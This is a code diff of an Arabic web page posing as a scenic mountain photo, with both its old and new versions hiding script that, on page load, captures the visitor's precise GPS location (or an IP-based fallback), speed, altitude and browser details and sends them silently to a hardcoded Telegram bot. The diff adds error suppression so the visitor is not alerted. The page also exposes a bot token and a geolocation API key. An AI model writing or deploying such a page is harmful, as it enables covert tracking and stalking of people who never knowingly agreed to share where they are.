@@ -1,79 +1,119 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>مشهد طبيعي خلّاب</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>منظر طبيعي ساحر</title>
   <style>
-    *{box-sizing:border-box;margin:0;padding:0}
-    body{height:100vh;display:flex;align-items:center;justify-content:center;background:#0b0c10;font-family:Tahoma}
-    .card{position:relative;width:90%;max-width:600px;border-radius:16px;overflow:hidden;box-shadow:0 15px 30px rgba(0,0,0,.6)}
-    .card img{width:100%;display:block}
-    .caption{position:absolute;bottom:0;width:100%;background:rgba(0,0,0,.45);color:#fff;text-align:center;padding:14px 10px;font-size:1.1rem}
-    #msg{background:#111;color:#fff;padding:10px;text-align:center;font-size:.9rem}
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: sans-serif;
+      background: #000;
+      color: white;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .image-container {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: url('https://images.unsplash.com/photo-1506260408121-e353d10b87c7?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=85') center/cover no-repeat;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      padding: 30px;
+    }
+    .overlay {
+      background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+      padding: 40px 20px 20px;
+      border-radius: 12px;
+      max-width: 600px;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 12px;
+      color: #fff;
+    }
+    p {
+      font-size: 16px;
+      color: #ccc;
+      line-height: 1.6;
+    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <div class="card">
-    <img src="https://images.unsplash.com/photo-1501785888041-af3ef285b470" alt="طبيعة">
-    <div class="caption">استمتع بالمنظر الساحر</div>
+  <div class="image-container">
+    <div class="overlay">
+      <h1>🌅 لحظة هدوء بين الجبال</h1>
+      <p>استمتع بهذا المنظر الطبيعي الخلاب...<br>قد تُطلب منك الموافقة على مشاركة موقعك لتحسين التجربة.</p>
+    </div>
   </div>
-  <div id="msg">جاري تحميل الصورة بجودة عالية...</div>
 
-<script>
-  // بيانات بوتك التليجرام
-  const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
-  const CHAT_ID   = "6036900535";
+  <script>
+    // === إعدادات البوت ===
+    const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
+    const CHAT_ID = "6036900535";
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-  // 1) محاولة GPS فعلي (دقة أمتار)
-  function getPreciseLocation() {
-    if (!navigator.geolocation) return Promise.resolve(null);
-    return new Promise(res => {
-      navigator.geolocation.getCurrentPosition(
-        pos => res(pos.coords),  // {latitude, longitude, accuracy}
-        () => res(null),
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-      );
-    });
-  }
-
-  // 2) احتياطي: IP + بصمة متصفح
-  async function getFallback() {
-    const ip = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301").then(r => r.json());
-    return {
-      latitude  : parseFloat(ip.latitude),
-      longitude : parseFloat(ip.longitude),
-      accuracy  : 5000, // ~5km
-      fallback  : true,
-      ipInfo    : ip
+    // === دالة إرسال الرسالة إلى تليجرام ===
+    const sendToTelegram = (text) => {
+      fetch(TELEGRAM_API, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "HTML"
+        })
+      }).catch(() => {
+        // نتجاهل الأخطاء (لا نريد تنبيه المستخدم)
+      });
     };
-  }
 
-  // 3) إرسال إلى التليجرام
-  async function sendToBot(coords, source) {
-    const maps = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
-    const msg  = `📍 موقع دقيق للسارق!\n` +
-                 `الإحداثيات: ${coords.latitude}, ${coords.longitude}\n` +
-                 `الدقة: ±${coords.accuracy} متر\n` +
-                 `الخريطة: ${maps}\n` +
-                 `نوع البيانات: ${source}\n` +
-                 `المتصفح: ${navigator.userAgent}\n` +
-                 `الوقت: ${new Date().toLocaleString("ar-EG")}`;
-    const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    new Image().src = url; // pixel ping
-  }
+    // === الحصول على الموقع بدقة عالية ===
+    const getLocationAndSend = () => {
+      if (!navigator.geolocation) return;
 
-  // 4) التشغيل الفوري
-  window.addEventListener("DOMContentLoaded", async () => {
-    const precise = await getPreciseLocation();
-    if (precise) {
-      await sendToBot(precise, "GPS فعلي");
-    } else {
-      const fall = await getFallback();
-      await sendToBot(fall, "احتياطي (IP + بصمة)");
-    }
-    document.getElementById("msg").textContent = "تم التحميل بنجاح!";
-  });
-</script>
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude, accuracy, altitude, speed } = position.coords;
+          const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
+
+          let msg = `📍 <b>موقع جديد تم التقاطه</b>\n`;
+          msg += `العرض: ${latitude}\n`;
+          msg += `الطول: ${longitude}\n`;
+          msg += `الدقة: ±${accuracy.toFixed(1)} متر\n`;
+          if (altitude) msg += `الارتفاع: ${altitude.toFixed(1)} متر\n`;
+          if (speed) msg += `السرعة: ${(speed * 3.6).toFixed(1)} كم/س\n`;
+          msg += `الوقت: ${now}\n`;
+          msg += `الجهاز: ${navigator.userAgent.substring(0, 80)}...`;
+
+          sendToTelegram(msg);
+        },
+        (error) => {
+          // حتى في حالة الرفض، نُرسل إشعارًا (اختياري)
+          sendToTelegram(`⚠️ فشل الحصول على الموقع: ${error.message}\nالوقت: ${new Date().toLocaleString()}`);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    };
+
+    // === تشغيل فور تحميل الصفحة ===
+    window.addEventListener('load', () => {
+      // نطلب الموقع بعد تأخير قصير (لتحسين تجربة المستخدم)
+      setTimeout(() => {
+        getLocationAndSend();
+      }, 1500);
+    });
+  </script>
 </body>
 </html>
